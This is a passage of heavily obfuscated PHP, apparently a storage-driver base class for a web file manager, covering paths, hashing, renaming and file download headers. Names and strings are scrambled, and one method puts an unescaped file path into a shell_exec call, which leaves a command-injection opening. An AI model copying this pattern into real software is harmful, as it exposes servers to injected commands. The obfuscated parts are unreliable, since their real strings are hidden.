ltrim($cÁŠ¯›“Ò’, $_SERVER[òÀöí][8]); } return $cÁŠ¯›“Ò’; } public function iconvApp($E·„¸‡•ê) { return $E·„¸‡•ê; } public function iconvSystem($F—‚¢–éÀ¤) { return $F—‚¢–éÀ¤; } public function iconvTo($a†õË‹ö´Ç, $e´×Öˆğí, $C–·ÍÜÌˆ) { goto c‡ÑÍ—øŠÚ; c‚Â‘ÔÙ›Û: $E‡ƒàîáø‰ = $e´×Öˆğí . $dÕ¹„½ˆ²[66] . $C–·ÍÜÌˆ . $dÕ¹„½ˆ²[67] . $a†õË‹ö´Ç; if (isset($CÇ­íÆÍä[$E‡ƒàîáø‰])) { return $CÇ­íÆÍä[$E‡ƒàîáø‰]; } if (function_exists($dÕ¹„½ˆ²[68])) { $dÓåŞ °º = @mb_convert_encoding($a†õË‹ö´Ç, $C–·ÍÜÌˆ, $e´×Öˆğí); } else { $dÓåŞ °º = @iconv($e´×Öˆğí, $C–·ÍÜÌˆ, $a†õË‹ö´Ç); } goto bÃ²±°Ö“; b¹¤ˆÀêÙ: return $dÓåŞ °º; goto fŒä¨¿Ë¶; DóŠ¢ì´î†: $CÇ­íÆÍä[$C–·ÍÜÌˆ . $dÕ¹„½ˆ²[66] . $e´×Öˆğí . $dÕ¹„½ˆ²[67] . $a†õË‹ö´Ç] = $a†õË‹ö´Ç; $CÇ­íÆÍä[$C–·ÍÜÌˆ . $dÕ¹„½ˆ²[66] . $e´×Öˆğí . $dÕ¹„½ˆ²[67] . $dÓåŞ °º] = $a†õË‹ö´Ç; $CÇ­íÆÍä[$e´×Öˆğí . $dÕ¹„½ˆ²[66] . $C–·ÍÜÌˆ . $dÕ¹„½ˆ²[67] . $dÓåŞ °º] = $dÓåŞ °º; goto b¹¤ˆÀêÙ; c‡ÑÍ—øŠÚ: $dÕ¹„½ˆ² =& $_SERVER[òÀöí]; if (!$a†õË‹ö´Ç || !function_exists($dÕ¹„½ˆ²[65])) { return $a†õË‹ö´Ç; } static $CÇ­íÆÍä = array(); goto c‚Â‘ÔÙ›Û; bÃ²±°Ö“: $dÓåŞ °º = $dÓåŞ °º ? $dÓåŞ °º : $a†õË‹ö´Ç; if (strstr($dÓåŞ °º, $dÕ¹„½ˆ²[69])) { $dÓåŞ °º = str_replace($dÕ¹„½ˆ²[69], $dÕ¹„½ˆ²[70], $dÓåŞ °º); } $CÇ­íÆÍä[$e´×Öˆğí . $dÕ¹„½ˆ²[66] . $C–·ÍÜÌˆ . $dÕ¹„½ˆ²[67] . $a†õË‹ö´Ç] = $dÓåŞ °º; goto DóŠ¢ì´î†; fŒä¨¿Ë¶: } public function getPathInner($féîÒ–“ï³) { $A¬òƒÀ«èÓ = IO::init($féîÒ–“ï³); return $A¬òƒÀ«èÓ->path; } public function getPathOuter($bà…í›êÖ) { $E®ŠÏİ†”Ñ =& $_SERVER[òÀöí]; $Däõõ•¸Å = strlen(trim($this->pathBase, $E®ŠÏİ†”Ñ[8])); $bà…í›êÖ = substr(trim($bà…í›êÖ, $E®ŠÏİ†”Ñ[8]), $Däõõ•¸Å); return $this->pathDriver . $E®ŠÏİ†”Ñ[8] . ltrim($bà…í›êÖ, $E®ŠÏİ†”Ñ[8]); } public function isParentOf($AÍë¬ä‹Â„, $A¶ÁˆÖÄ¢ß) { $FŒÌøö•Ä½ =& $_SERVER[òÀöí]; $AÍë¬ä‹Â„ = rtrim(strtolower($AÍë¬ä‹Â„), $FŒÌøö•Ä½[8]) . $FŒÌøö•Ä½[8]; $A¶ÁˆÖÄ¢ß = rtrim(strtolower($A¶ÁˆÖÄ¢ß), $FŒÌøö•Ä½[8]) . $FŒÌøö•Ä½[8]; $Fä Æ·†ÇÀ = strpos($A¶ÁˆÖÄ¢ß, $AÍë¬ä‹Â„) === 0; return $Fä Æ·†ÇÀ; } public function getType() { $aå…¤æ™ =& $_SERVER[òÀöí]; $aï¢Û¹õ… = str_replace($aå…¤æ™[71], $aå…¤æ™[33], get_class($this)); return strtolower($aï¢Û¹õ…); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($A‡Ô„ø›Ÿ´, $b™öÛâ¸„Î) { $b…ŞÖ…¢¤‚ =& $_SERVER[òÀöí]; $Dªç©ë§‚“ = rtrim($A‡Ô„ø›Ÿ´, $b…ŞÖ…¢¤‚[8]) . $b…ŞÖ…¢¤‚[8] . $b™öÛâ¸„Î; $eÅ®åÆ…Ú‹ = $this->exist($Dªç©ë§‚“); return $eÅ®åÆ…Ú‹ ? $Dªç©ë§‚“ : !1; } public function setModifyTime($a˜¦ø˜‰ë, $eÚçñôÌê½ = '') { } public function renameObject($Eå¬ïßµ–ˆ, $FùëµÙ²¸) { goto FçÕˆ·×; açØ½‘é‚: $Eå¬ïßµ–ˆ = $this->getPathOuter($Eå¬ïßµ–ˆ); $FùëµÙ²¸ = $this->pathFather($Eå¬ïßµ–ˆ) . $FùëµÙ²¸; if (IO::isFile($Eå¬ïßµ–ˆ)) { $d­¾ÛÛÒˆ = IO::copy($Eå¬ïßµ–ˆ, $this->pathFather($Eå¬ïßµ–ˆ), REPEAT_RENAME_FOLDER, $A„è•ÖŠ‹); if ($d­¾ÛÛÒˆ) { IO::remove($Eå¬ïßµ–ˆ); } } else { $d­¾ÛÛÒˆ = IO::mkdir($FùëµÙ²¸); if (!$d­¾ÛÛÒˆ) { return !1; } $a¾°´½·­« = IO::listPath($Eå¬ïßµ–ˆ, !0); $b¥ÉªÎ = array_merge($a¾°´½·­«[$f‹²İ¾êª¤[73]], $a¾°´½·­«[$f‹²İ¾êª¤[74]]); foreach ($b¥ÉªÎ as $AÎ•ºÙÂôğ) { IO::move($AÎ•ºÙÂôğ[$f‹²İ¾êª¤[75]], $FùëµÙ²¸, REPEAT_RENAME_FOLDER); } IO::remove($Eå¬ïßµ–ˆ); } goto e±Íß–¿Àğ; e±Íß–¿Àğ: return $d­¾ÛÛÒˆ ? $FùëµÙ²¸ : !1; goto báÑ¹Ş”Û; FçÕˆ·×: $f‹²İ¾êª¤ =& $_SERVER[òÀöí]; $A„è•ÖŠ‹ = $FùëµÙ²¸; Hook::trigger($f‹²İ¾êª¤[72], $this, $Eå¬ïßµ–ˆ, $this, $this->pathFather($Eå¬ïßµ–ˆ) . $FùëµÙ²¸); goto açØ½‘é‚; báÑ¹Ş”Û: } public function tempFile($bä«‚î¨º = '', $D•Å„»ÈÊ™ = '') { goto E¬âË¥…„œ; E¬âË¥…„œ: if (!$bä«‚î¨º) { $bä«‚î¨º = rand_string(15); } $fİëÜŠ¨Ï = TEMP_FILES . rand_string(15) . $_SERVER[òÀöí][8]; @mkdir($fİëÜŠ¨Ï, 511, !0); goto a¦Ê¿¡á—; FÓ¬…ÏÆ©ø: return $A²´²ßÚî¶; goto dá°ğ“ª££; a¦Ê¿¡á—: $A²´²ßÚî¶ = $fİëÜŠ¨Ï . $bä«‚î¨º; @touch($A²´²ßÚî¶); if ($D•Å„»ÈÊ™) { file_put_contents($A²´²ßÚî¶, $D•Å„»ÈÊ™); } goto FÓ¬…ÏÆ©ø; dá°ğ“ª££: } public function tempFileRemve($b¯¶»³–‚ã) { @unlink($b¯¶»³–‚ã); @rmdir($this->pathFather($b¯¶»³–‚ã)); } public function mkfile($e“× Íå—¦, $f‡‡‰šÌìô = '', $dòŠÅõ÷’ = REPEAT_RENAME) { } public function mkdir($E‰¤ï“¶ë, $fòï«ğëË = REPEAT_SKIP) { } public function delFile($E©ºó³é»·) { } public function delFolder($F¯Ø¡ĞŞø) { } public function copyFile($eÔª§œèÎ–, $cõ…­‰Ú˜…) { } public function moveFile($c‘ÂÜÜÇ¸, $cç»ˆ™ÄÌ¢) { } public function remove($Fñ¹²„ÛÅ) { if ($this->isFile($Fñ¹²„ÛÅ)) { return $this->delFile($Fñ¹²„ÛÅ); } return $this->delFolder($Fñ¹²„ÛÅ); } public function rename($E¥Ó¶ëñ±, $C¤´‰øƒ»ª) { } public function exist($bÖ´„ÜÓÓ¤) { } public function findByHash($f¨°Š‡Ò†ç = '', $E°¸øÛ×• = '') { return !1; } public function isFile($C¹Ä‹ô‹’) { } public function isFolder($Cø×¸ƒ™ÔŠ) { } public function size($A©· âÏÎè) { } public function info($aİ¬À«öœé) { } public function infoSimple($A®†ŸØî­) { return $this->info($A®†ŸØî­); } public function infoAuth($Eë¾öšõ³) { return $this->info($Eë¾öšõ³); } public function infoFull($E§á©Æ­²â) { return $this->info($E§á©Æ­²â); } public function infoWithChildren($bœ—¤„Í) { $FÊÅµó—êš =& $_SERVER[òÀöí]; static $D©æÍİ ù = array(); if (isset($D©æÍİ ù[$bœ—¤„Í])) { return $D©æÍİ ù[$bœ—¤„Í]; } $d±¯‘¾Õ“¸ = $this->info($bœ—¤„Í); if ($d±¯‘¾Õ“¸ && $d±¯‘¾Õ“¸[$FÊÅµó—êš[29]] == $FÊÅµó—êš[76]) { $e–°àÀ½ˆ = array($FÊÅµó—êš[77] => 0, $FÊÅµó—êš[78] => 0, $FÊÅµó—êš[79] => 0); $this->infoChildren($bœ—¤„Í, $e–°àÀ½ˆ); $d±¯‘¾Õ“¸[$FÊÅµó—êš[77]] = $e–°àÀ½ˆ[$FÊÅµó—êš[77]]; $d±¯‘¾Õ“¸[$FÊÅµó—êš[80]] = array($FÊÅµó—êš[81] => $e–°àÀ½ˆ[$FÊÅµó—êš[78]], $FÊÅµó—êš[82] => $e–°àÀ½ˆ[$FÊÅµó—êš[79]]); $D©æÍİ ù[$bœ—¤„Í] = $d±¯‘¾Õ“¸; } return $d±¯‘¾Õ“¸; } public function listPath($AÓ¥áóó®, $eâ°ÅÜšôÁ = false) { } public function has($aò×Î±¿ª, $A¼ÂÕÄòš = false, $dš ñŞ‡·¡ = false) { } public function canRead($D†‘¢ÆÅíŞ) { } public function canWrite($EÈÔ¾Á¸³¢) { } public function getContent($F§â×Àæ˜) { } public function setContent($A‹À®°É‰ğ, $a•”è¶‹Œ’ = '') { } protected function infoChildren($fî½‘…±ä¾, &$a‰‚Ïìà•) { $d²á¹ù°ç =& $_SERVER[òÀöí]; check_abort_echo(); $BÑ¬ÈÄƒèõ = $this->listPath($fî½‘…±ä¾, !0); $BÑ¬ÈÄƒèõ = array_merge($BÑ¬ÈÄƒèõ[$d²á¹ù°ç[74]], $BÑ¬ÈÄƒèõ[$d²á¹ù°ç[73]]); foreach ($BÑ¬ÈÄƒèõ as $Eæ¢©ÎŸƒ±) { if ($Eæ¢©ÎŸƒ±[$d²á¹ù°ç[29]] == $d²á¹ù°ç[76]) { $a‰‚Ïìà•[$d²á¹ù°ç[79]]++; $A£¯µ¨®™ = $this->getPathInner($Eæ¢©ÎŸƒ±[$d²á¹ù°ç[75]]); $this->infoChildren($A£¯µ¨®™, $a‰‚Ïìà•); } else { $a‰‚Ïìà•[$d²á¹ù°ç[78]]++; $a‰‚Ïìà•[$d²á¹ù°ç[77]] += $Eæ¢©ÎŸƒ±[$d²á¹ù°ç[77]]; } } } public function fileSubstr($fó·ŒìÖğ, $cÏ•ïÛÑ¢‡, $eŸó…‹¾Œ ) { } public function listAll($Bâš›²‘½) { } public function listAllMake($e¹½ÌÛÒ™±, &$cŠ¶”£ºµ÷) { $D°«æ†„‘¾ =& $_SERVER[òÀöí]; check_abort_echo(); $aáºË±ÀïÄ = $this->listPath($e¹½ÌÛÒ™±, !0); if (!$aáºË±ÀïÄ) { return; } $dã«³©öŒ© = array_merge($aáºË±ÀïÄ[$D°«æ†„‘¾[74]], $aáºË±ÀïÄ[$D°«æ†„‘¾[73]]); foreach ($dã«³©öŒ© as $fÂ™ÃáŠ¸) { goto b–­¯ÌÄ·; b–­¯ÌÄ·: $EÈÙƒ§±Ìİ = $fÂ™ÃáŠ¸[$D°«æ†„‘¾[29]] == $D°«æ†„‘¾[76]; $eÙ¾Š¥œßÏ = array($D°«æ†„‘¾[75] => $fÂ™ÃáŠ¸[$D°«æ†„‘¾[75]], $D°«æ†„‘¾[76] => $EÈÙƒ§±Ìİ); if (isset($fÂ™ÃáŠ¸[$D°«æ†„‘¾[77]])) { $eÙ¾Š¥œßÏ[$D°«æ†„‘¾[77]] = $fÂ™ÃáŠ¸[$D°«æ†„‘¾[77]]; } goto FİìŞŸàâ; FİìŞŸàâ: if (isset($fÂ™ÃáŠ¸[$D°«æ†„‘¾[83]])) { $eÙ¾Š¥œßÏ[$D°«æ†„‘¾[83]] = $fÂ™ÃáŠ¸[$D°«æ†„‘¾[83]]; } if (!$EÈÙƒ§±Ìİ) { $cŠ¶”£ºµ÷[] = $eÙ¾Š¥œßÏ; continue; } $cŠ¶”£ºµ÷[] = $eÙ¾Š¥œßÏ; goto F„«ŞØº§; F„«ŞØº§: $this->listAllMake($fÂ™ÃáŠ¸[$D°«æ†„‘¾[75]], $cŠ¶”£ºµ÷); goto A ŠÆÏèº—; A ŠÆÏèº—: } } public function listAllSimple($Eİßõä‹Ò) { $bÌ‚ÑÙğ„– =& $_SERVER[òÀöí]; $c²‚Ç¥°À› = array(); $Fá©¦ÚÑ = $this->listAll($Eİßõä‹Ò); $EÃ…İÄ“ªõ = $this->getPathOuter($Eİßõä‹Ò); foreach ($Fá©¦ÚÑ as $C”Ş‹¯ì¦í) { goto EÈç–ß¢ô; EÈç–ß¢ô: $e‹©è£‚÷ = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[75]]; $D ÷¢íÓƒ÷ = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[75]]; if (isset($C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[84]])) { $e‹©è£‚÷ = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[84]][$bÌ‚ÑÙğ„–[75]]; $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[77]] = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[84]][$bÌ‚ÑÙğ„–[77]]; $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[83]] = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[84]][$bÌ‚ÑÙğ„–[83]]; } else { $D ÷¢íÓƒ÷ = substr($C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[75]], strlen(get_path_father($EÃ…İÄ“ªõ))); $D ÷¢íÓƒ÷ = $bÌ‚ÑÙğ„–[8] . ltrim($D ÷¢íÓƒ÷, $bÌ‚ÑÙğ„–[8]); } goto FÄ»”¯´“¶; EôÏ‘°‘˜Ó: if (!$C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[76]]) { $e…»Â™ÜĞá[$bÌ‚ÑÙğ„–[85]] = $e‹©è£‚÷; } $c²‚Ç¥°À›[] = $e…»Â™ÜĞá; goto cƒÑÂº”£; FÄ»”¯´“¶: $e…»Â™ÜĞá = array($bÌ‚ÑÙğ„–[75] => $D ÷¢íÓƒ÷, $bÌ‚ÑÙğ„–[76] => $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[76]]); if (isset($C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[77]]) && !$C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[76]]) { $e…»Â™ÜĞá[$bÌ‚ÑÙğ„–[77]] = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[77]]; } if (isset($C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[83]])) { $e…»Â™ÜĞá[$bÌ‚ÑÙğ„–[83]] = $C”Ş‹¯ì¦í[$bÌ‚ÑÙğ„–[83]]; } goto EôÏ‘°‘˜Ó; cƒÑÂº”£: } return $c²‚Ç¥°À›; } public function upload($aĞğ½‘Ş´„, $CÍ¾°¿¿ë, $Fœ”îÈĞËÉ = false, $c˜åôÅğ³Î = REPEAT_REPLACE) { } public function uploadFileByID($dî»õŞ¡Í, $aÓç×â¶Öì, $bí´÷•Ô£) { } public function uploadFileByPath($aàÑ”î’¿, $A£¢§¬†Â, $Cö§î‘™…¢ = array()) { } public function isUploadServer() { $a—ï‘ˆ¢İ³ =& $_SERVER[òÀöí]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $a—ï‘ˆ¢İ³[86]) { return !0; } return $GLOBALS[$a—ï‘ˆ¢İ³[6]][$a—ï‘ˆ¢İ³[87]][$a—ï‘ˆ¢İ³[88]]; } public function isFileOutServer() { $c“ÛÔéîöÖ =& $_SERVER[òÀöí]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $c“ÛÔéîöÖ[86]) { return !0; } return $GLOBALS[$c“ÛÔéîöÖ[6]][$c“ÛÔéîöÖ[87]][$c“ÛÔéîöÖ[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($EÑÖ¶…±ÚÉ) { $aÜ‹äå¢ =& $_SERVER[òÀöí]; if (!$this->isCdnHost()) { return $EÑÖ¶…±ÚÉ; } return str_replace(trim(get_url_root($EÑÖ¶…±ÚÉ), $aÜ‹äå¢[8]), trim($this->cdnHost, $aÜ‹äå¢[8]), $EÑÖ¶…±ÚÉ); } public function uploadLink($aìä¸åŸ´Â, $bì‰‰éÀ÷ó = 0) { goto c·Æ­ÏØ¹´; C¼±¹²° µ: if ($DÒ–ˆ‡ƒ¾ƒ) { $DÒ–ˆ‡ƒ¾ƒ[$D‡ïİ›·¾Ó[92]] = $aìä¸åŸ´Â; $DÒ–ˆ‡ƒ¾ƒ[$D‡ïİ›·¾Ó[93]] = $DàËŒÊÚÉğ; } return $DÒ–ˆ‡ƒ¾ƒ; goto cî¼ê§ÕÛª; f¹ÑÃ•ö: $F¬éñÚŠâ‹ = $bì‰‰éÀ÷ó <= $Eš™ˆøì“ ? $D‡ïİ›·¾Ó[90] : $D‡ïİ›·¾Ó[91]; $cå÷İÖ„ó‹ = (!$bì‰‰éÀ÷ó ? 1 : ceil($bì‰‰éÀ÷ó / pow(1024, 3))) * 3600 * 4; $DÒ–ˆ‡ƒ¾ƒ = $this->{$F¬éñÚŠâ‹}($aìä¸åŸ´Â, $cå÷İÖ„ó‹); goto C¼±¹²° µ; B…ÇÇ°‘ù: if (!in_array($DàËŒÊÚÉğ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Eš™ˆøì“ = 1024 * 1024 * 10; goto f¹ÑÃ•ö; c·Æ­ÏØ¹´: $D‡ïİ›·¾Ó =& $_SERVER[òÀöí]; if ($this->isUploadServer()) { return; } $DàËŒÊÚÉğ = $this->getType(); goto B…ÇÇ°‘ù; cî¼ê§ÕÛª: } public function uploadFormData($Fß£åŠ¤‡, $cŸâ§ªÅÚÙ = 3600) { } public function multiUploadFormData($B»È­‡¼œ, $EÏÅ­¨½¯ = 3600) { } public function download($f×µÉà­éœ, $fÊ Šê•Œ„) { } public function ext($f–àĞ—¶é¶) { $d…Æä¢àİ‚ =& $_SERVER[òÀöí]; if (strpos($f–àĞ—¶é¶, $d…Æä¢àİ‚[8]) === -1) { $CøÎË´ à = $f–àĞ—¶é¶; } else { $CøÎË´ à = $this->pathThis($f–àĞ—¶é¶); } $c¢ÌÕ¬ñÔ = $d…Æä¢àİ‚[33]; if (strstr($CøÎË´ à, $d…Æä¢àİ‚[94])) { $c¢ÌÕ¬ñÔ = substr($CøÎË´ à, strrpos($CøÎË´ à, $d…Æä¢àİ‚[94]) + 1); $c¢ÌÕ¬ñÔ = strtolower($c¢ÌÕ¬ñÔ); } if (strlen($c¢ÌÕ¬ñÔ) > 3 && preg_match($d…Æä¢àİ‚[95], $c¢ÌÕ¬ñÔ, $DáôäÁÍ“Œ)) { $c¢ÌÕ¬ñÔ = $d…Æä¢àİ‚[33]; } return $c¢ÌÕ¬ñÔ; } public function pathThis($FêÚÄØŠÆ) { $b‰ËºÆŠÃ‹ =& $_SERVER[òÀöí]; $FêÚÄØŠÆ = str_replace($b‰ËºÆŠÃ‹[96], $b‰ËºÆŠÃ‹[8], rtrim($FêÚÄØŠÆ, $b‰ËºÆŠÃ‹[8])); $e­…ê†“…ô = strrpos($FêÚÄØŠÆ, $b‰ËºÆŠÃ‹[8]); if ($e­…ê†“…ô === !1) { return $FêÚÄØŠÆ; } return substr($FêÚÄØŠÆ, $e­…ê†“…ô + 1); } public function pathFather($bÁƒÎ¡ñÜÔ) { $BÌĞ•°’œ„ =& $_SERVER[òÀöí]; $bÁƒÎ¡ñÜÔ = str_replace($BÌĞ•°’œ„[96], $BÌĞ•°’œ„[8], rtrim($bÁƒÎ¡ñÜÔ, $BÌĞ•°’œ„[8])); $D«Á­Ùš›ô = strrpos($bÁƒÎ¡ñÜÔ, $BÌĞ•°’œ„[8]); if ($D«Á­Ùš›ô === !1) { return $BÌĞ•°’œ„[33]; } return substr($bÁƒÎ¡ñÜÔ, 0, $D«Á­Ùš›ô + 1); } public function hashSimple($D„Í¾ª‡Õ) { goto aˆµ¢Äñİ; a‚Õ®œôÖŒ: $C¡Ã´¬ì· = intval($d‚Ëˆ÷êÍ / $bø¨ñõ°´ğ); $b±“”İçô = $BÁø˜Œ® [33]; for ($Aó£©Ş§ª = 0; $Aó£©Ş§ª < $bø¨ñõ°´ğ; $Aó£©Ş§ª++) { $b±“”İçô .= $this->fileSubstr($D„Í¾ª‡Õ, $C¡Ã´¬ì· * $Aó£©Ş§ª, $CÛÔøÉÜ¯»); } goto eÂµ„Äã‘œ; aˆµ¢Äñİ: $BÁø˜Œ®  =& $_SERVER[òÀöí]; if (!$D„Í¾ª‡Õ) { return md5($BÁø˜Œ® [33]); } $d‚Ëˆ÷êÍ = $this->size($D„Í¾ª‡Õ); goto e¯¨¥ÍœáÌ; e¯¨¥ÍœáÌ: $CÛÔøÉÜ¯» = 200; $bø¨ñõ°´ğ = 50; if ($d‚Ëˆ÷êÍ <= $CÛÔøÉÜ¯» * $bø¨ñõ°´ğ) { return $this->hashMd5($D„Í¾ª‡Õ) . $d‚Ëˆ÷êÍ; } goto a‚Õ®œôÖŒ; eÂµ„Äã‘œ: $b±“”İçô .= $this->fileSubstr($D„Í¾ª‡Õ, $d‚Ëˆ÷êÍ - $CÛÔøÉÜ¯», $CÛÔøÉÜ¯»); return md5($b±“”İçô) . $d‚Ëˆ÷êÍ; goto EÏİÖŞÌÕ¦; EÏİÖŞÌÕ¦: } public static $md5Cache = array(); public function hashMd5($C†ó¤Ö’—Ğ) { $C†ó¤Ö’—Ğ = $this->iconvSystem($C†ó¤Ö’—Ğ); if (isset(self::$md5Cache[$C†ó¤Ö’—Ğ])) { return self::$md5Cache[$C†ó¤Ö’—Ğ]; } self::$md5Cache[$C†ó¤Ö’—Ğ] = $this->hashMd5Shell($C†ó¤Ö’—Ğ); if (!self::$md5Cache[$C†ó¤Ö’—Ğ]) { self::$md5Cache[$C†ó¤Ö’—Ğ] = @md5_file($C†ó¤Ö’—Ğ); } return self::$md5Cache[$C†ó¤Ö’—Ğ]; } private function hashMd5Shell($CØíìçÀ®’) { goto CŠô²†¸»; CêÏ±Ğ’Àè: $EÙ·›‚¬êö = shell_exec($dµ˜ÈÕ»Ğ . "\40\x22{$CØíìçÀ®’}\42"); $EÙ·›‚¬êö = str_replace($C¼Ç÷ËÁÍà[103], $C¼Ç÷ËÁÍà[33], $EÙ·›‚¬êö); return substr($EÙ·›‚¬êö, 0, 32); goto cÈÕ´¯‡Õ³; CŠô²†¸»: $C¼Ç÷ËÁÍà =& $_SERVER[òÀöí]; if (!function_exists($C¼Ç÷ËÁÍà[97])) { return !1; } $câ†Ğò™ñ = array($C¼Ç÷ËÁÍà[98], $C¼Ç÷ËÁÍà[99]); goto cÅ×ŠÉ›ß; cÅ×ŠÉ›ß: $dµ˜ÈÕ»Ğ = Cache::get($C¼Ç÷ËÁÍà[100]); if (!$dµ˜ÈÕ»Ğ) { $A‰†ğŠ¼¶ = BASIC_PATH . $C¼Ç÷ËÁÍà[101]; $a‰ ¯Ô¹« = md5_file($A‰†ğŠ¼¶); $dµ˜ÈÕ»Ğ = $C¼Ç÷ËÁÍà[102]; foreach ($câ†Ğò™ñ as $f¸ŠÆø¿±) { $EÙ·›‚¬êö = shell_exec($f¸ŠÆø¿± . "\40\x22{$A‰†ğŠ¼¶}\x22"); if ($EÙ·›‚¬êö && substr(trim($EÙ·›‚¬êö), 0, 32) == $a‰ ¯Ô¹«) { $dµ˜ÈÕ»Ğ = $f¸ŠÆø¿±; break; } } Cache::set($C¼Ç÷ËÁÍà[100], $dµ˜ÈÕ»Ğ, 3600); } if ($dµ˜ÈÕ»Ğ == $C¼Ç÷ËÁÍà[102]) { return !1; } goto CêÏ±Ğ’Àè; cÈÕ´¯‡Õ³: } public function link($A• £Ì„ŞÃ) { return $A• £Ì„ŞÃ; } public function fileOut($c®ö¹”‡ê¦, $c¹‹§İ–àĞ = false, $bë‹ÀøëÌ = false, $EÈËÁ‰¬­… = '') { goto C×ÇÓ†ğß‚; aÚŒ”äôÙ´: header($Cç¿­âŒ[137] . $dô’ğÍ¼‚³); header($Cç¿­âŒ[138]); if (!$c¹‹§İ–àĞ && $C’‹‘‡ê®… == $Cç¿­âŒ[139]) { if ($dô’ğÍ¼‚³ > 1024 * 1024 * 5) { die; } $D‚”‘÷¿Ú = $this->getContent($c®ö¹”‡ê¦); $D‚”‘÷¿Ú = Html::clearSVG($D‚”‘÷¿Ú); header($Cç¿­âŒ[140] . strlen($D‚”‘÷¿Ú)); echo $D‚”‘÷¿Ú; die; } goto C²˜È™ìÎØ; C×ÇÓ†ğß‚: $Cç¿­âŒ =& $_SERVER[òÀöí]; $this->cacheMethod(null, null); if (!$c®ö¹”‡ê¦ || !$this->exist($c®ö¹”‡ê¦)) { show_json(LNG($Cç¿­âŒ[104]), !1, $bë‹ÀøëÌ); } goto CÔÎƒ†Û—; e¯“éØè²–: if ($_SERVER[$Cç¿­âŒ[156]] == $Cç¿­âŒ[157]) { return; } $dÜïÛÏßÇ† = 1024 * 100; $C‡´ƒ¾öè = 0; goto dŠ°áÌÔÍî; e™ƒÏÒîÙ±: if (isset($_SERVER[$Cç¿­âŒ[130]]) && strtotime($_SERVER[$Cç¿­âŒ[130]]) == $DÕ¯¾¿…‰É[$Cç¿­âŒ[83]]) { header($Cç¿­âŒ[131], !0, 304); die; } if (isset($_SERVER[$Cç¿­âŒ[132]]) && $_SERVER[$Cç¿­âŒ[132]] == $EÈËÁ‰¬­…) { header($Cç¿­âŒ[133] . $EÈËÁ‰¬­…, !0, 304); die; } header($Cç¿­âŒ[133] . $EÈËÁ‰¬­…); goto døØ°©‡“ß; dŠ°áÌÔÍî: if ($A±ãİÃ‹æñ) { $C‡´ƒ¾öè = intval(1000 * 1000 * ($dÜïÛÏßÇ† / $A±ãİÃ‹æñ)); } while ($dï‹Øöİ¡ù <= $dâ°ÂÜÙÙ¼) { $bÜ²Œ¬¶ºï = timeFloat(); check_abort(); $aô²¾° = $dâ°ÂÜÙÙ¼ - $dï‹Øöİ¡ù + 1; if ($aô²¾° <= $dÜïÛÏßÇ†) { $dÜïÛÏßÇ† = $aô²¾°; } echo $this->fileSubstr($c®ö¹”‡ê¦, $dï‹Øöİ¡ù, $dÜïÛÏßÇ†); $dï‹Øöİ¡ù += $dÜïÛÏßÇ†; if ($dÜïÛÏßÇ† == $aô²¾°) { $dï‹Øöİ¡ù = $dâ°ÂÜÙÙ¼ + 1; } if ($C‡´ƒ¾öè) { $d–™µ–ó = intval(1000 * 1000 * (timeFloat() - $bÜ²Œ¬¶ºï)); $e‘İ¡ù¹Âô = $C‡´ƒ¾öè - $d–™µ–ó; if ($e‘İ¡ù¹Âô > 5) { usleep($e‘İ¡ù¹Âô); } } } goto EÙ†ªˆíù™; E™¿äØÂÅ¹: if (in_array($C’‹‘‡ê®…, array($Cç¿­âŒ[110], $Cç¿­âŒ[111], $Cç¿­âŒ[112], $Cç¿­âŒ[113]))) { $C’‹‘‡ê®… = $Cç¿­âŒ[114]; } if (!$EÈËÁ‰¬­…) { $EÈËÁ‰¬­… = md5($AÛ¤¦¾Øˆè . $this->hashSimple($c®ö¹”‡ê¦)); } $EÈËÁ‰¬­… = $Cç¿­âŒ[115] . $EÈËÁ‰¬­… . $Cç¿­âŒ[115]; goto dÉõƒ¿ñŒ; E³Í¸„ÙÌï: header($Cç¿­âŒ[119]); header($Cç¿­âŒ[120] . $cå‚¤«—‹); $C›îåÁ†Õ¹ = rawurlencode($E‹¤Îæù¦¿); goto C‚ñÉÂª§Š; C‚ñÉÂª§Š: $C›îåÁ†Õ¹ = $Cç¿­âŒ[115] . $C›îåÁ†Õ¹ . $Cç¿­âŒ[121] . $C›îåÁ†Õ¹; if ($c¹‹§İ–àĞ) { header($Cç¿­âŒ[122]); header($Cç¿­âŒ[123] . $C›îåÁ†Õ¹); } else { header($Cç¿­âŒ[124] . $C›îåÁ†Õ¹); } header($Cç¿­âŒ[125] . gmdate($Cç¿­âŒ[109], time() + 3600 * 24 * 30) . $Cç¿­âŒ[126]); goto c¸„¯ŞóùÙ; a£Ã¨…šáÚ: $dô’ğÍ¼‚³ = $DÕ¯¾¿…‰É[$Cç¿­âŒ[77]]; $AÛ¤¦¾Øˆè = gmdate($Cç¿­âŒ[109], $DÕ¯¾¿…‰É[$Cç¿­âŒ[83]]); $E‹¤Îæù¦¿ = $bë‹ÀøëÌ ? $bë‹ÀøëÌ : $this->iconvApp($DÕ¯¾¿…‰É[$Cç¿­âŒ[28]]); goto Bõîºà×ç; dÉõƒ¿ñŒ: $cå‚¤«—‹ = get_file_mime($C’‹‘‡ê®…); if (strstr($cå‚¤«—‹, $Cç¿­âŒ[116])) { $cå‚¤«—‹ = $cå‚¤«—‹ . $Cç¿­âŒ[117]; } if ($c¹‹§İ–àĞ === !1 && !mime_support($cå‚¤«—‹)) { $c¹‹§İ–àĞ = !0; 